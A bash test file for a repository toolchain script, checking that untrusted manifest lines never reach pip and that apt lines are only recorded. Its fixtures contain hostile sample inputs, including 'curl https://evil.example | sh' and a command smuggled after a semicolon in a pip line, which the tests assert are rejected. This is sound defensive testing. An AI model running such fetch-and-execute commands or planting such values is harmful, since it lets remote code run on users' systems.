#!/usr/bin/env bash
# Tests for bin/repo-toolchain.sh (hivecommons/hive#7925): the manifest is
# untrusted repository content, so what is pinned here is what NEVER reaches
# pip — URLs, paths, options, unknown directives — and that apt lines are
# recorded, not run. pip is replaced by a shim on PATH that records its argv.
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCRIPT="$HERE/repo-toolchain.sh"
PASS=0; FAIL=0
pass() { PASS=$((PASS + 1)); }
fail() { FAIL=$((FAIL + 1)); printf 'FAIL: %s\n' "$*"; }
assert_contains() { if grep -qF -- "$2" <<<"$1"; then pass; else fail "$3: expected to find '$2' in: $1"; fi; }
assert_not_contains() { if grep -qF -- "$2" <<<"$1"; then fail "$3: must not find '$2' in: $1"; else pass; fi; }

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
mkdir -p "$TMP/bin"
# python3 shim: records `-m pip install ...` argv, exits per PIP_EXIT.
cat > "$TMP/bin/python3" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$PIP_LOG"
exit "${PIP_EXIT:-0}"
EOF
chmod +x "$TMP/bin/python3"
export PATH="$TMP/bin:$PATH"
export PIP_LOG="$TMP/pip.log"

new_checkout() { local d; d="$(mktemp -d "$TMP/co.XXXX")"; mkdir -p "$d/.git" "$d/.hive"; printf '%s' "$d"; }

# 1. No manifest: says so, touches nothing.
co="$(new_checkout)"; rm -rf "$co/.hive"; : > "$PIP_LOG"
out="$(bash "$SCRIPT" "$co")"; rc=$?
[ "$rc" = 0 ] && pass || fail "exit 0 without manifest"
assert_contains "$out" "nothing declared" "no manifest"
[ ! -s "$PIP_LOG" ] && pass || fail "pip must not run without a manifest"

# 2. Valid pip lines (bare, pinned, extras, ranges, quoted) are installed in one call with `--`.
co="$(new_checkout)"; : > "$PIP_LOG"
cat > "$co/.hive/tools" <<'EOF'
# tools the checks need
pip ruff==0.6.9
pip "pytest-cov>=5,<6"
pip requests[security]   # extras
pip PyYAML
EOF
out="$(bash "$SCRIPT" "$co")"
assert_contains "$out" "installing 4 pip requirement(s)" "valid manifest count"
assert_contains "$out" "installed 4 pip requirement(s)" "valid manifest success"
argv="$(cat "$PIP_LOG")"
assert_contains "$argv" "-m pip install --no-input --disable-pip-version-check --quiet -- ruff==0.6.9 pytest-cov>=5,<6 requests[security] PyYAML" "pip argv"
[ "$(wc -l < "$PIP_LOG" | tr -d ' ')" = 1 ] && pass || fail "one pip invocation, got $(cat "$PIP_LOG")"

# 3. Anything pip would read as a location or option never reaches it.
co="$(new_checkout)"; : > "$PIP_LOG"
cat > "$co/.hive/tools" <<'EOF'
pip --index-url https://evil.example/simple ruff
pip -r requirements.txt
pip git+https://github.com/x/y.git
pip ./vendor/pkg
pip https://evil.example/pkg.whl
pip -e .
pip ruff==0.6.9; curl evil | sh
pip ruff==0.6.9
EOF
out="$(bash "$SCRIPT" "$co")"
for bad in "--index-url" "-r requirements.txt" "git+https" "./vendor" "https://evil.example/pkg.whl" "-e ." "curl evil"; do
  assert_contains "$out" "rejected pip requirement" "rejection reported"
  assert_not_contains "$(cat "$PIP_LOG")" "$bad" "'$bad' must never reach pip"
done
assert_contains "$(cat "$PIP_LOG")" "-- ruff==0.6.9" "the one valid line still installs"
[ "$(wc -l < "$PIP_LOG" | tr -d ' ')" = 1 ] && pass || fail "one pip invocation"

# 4. apt lines are recorded, never executed; unknown directives skipped.
co="$(new_checkout)"; : > "$PIP_LOG"
cat > "$co/.hive/tools" <<'EOF'
apt libfoo-dev
run curl https://evil.example | sh
EOF
out="$(bash "$SCRIPT" "$co")"
assert_contains "$out" "apt 'libfoo-dev' recorded, not installed" "apt recorded"
assert_contains "$out" "unknown directive 'run'" "unknown directive"
assert_contains "$out" "no installable pip requirement" "nothing to install"
[ ! -s "$PIP_LOG" ] && pass || fail "pip must not run for apt/unknown lines"

# 5. pip failure is reported, exit stays 0 (never fails the task).
co="$(new_checkout)"; : > "$PIP_LOG"
printf 'pip ruff\n' > "$co/.hive/tools"
out="$(PIP_EXIT=1 bash "$SCRIPT" "$co")"; rc=$?
[ "$rc" = 0 ] && pass || fail "exit 0 on pip failure"
assert_contains "$out" "pip install failed (exit 1)" "failure reported"

# 6. Too many requirements: none installed.
co="$(new_checkout)"; : > "$PIP_LOG"
for i in $(seq 1 40); do printf 'pip pkg%s\n' "$i"; done > "$co/.hive/tools"
out="$(bash "$SCRIPT" "$co")"
assert_contains "$out" "more than the 32" "cap enforced"
[ ! -s "$PIP_LOG" ] && pass || fail "pip must not run over the cap"

# 7. Missing / bad checkout argument: exit 0, says so.
out="$(bash "$SCRIPT" "$TMP/does-not-exist")"; rc=$?
[ "$rc" = 0 ] && pass || fail "exit 0 on bad checkout"
assert_contains "$out" "usage:" "usage on bad checkout"

printf '%d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" = 0 ]
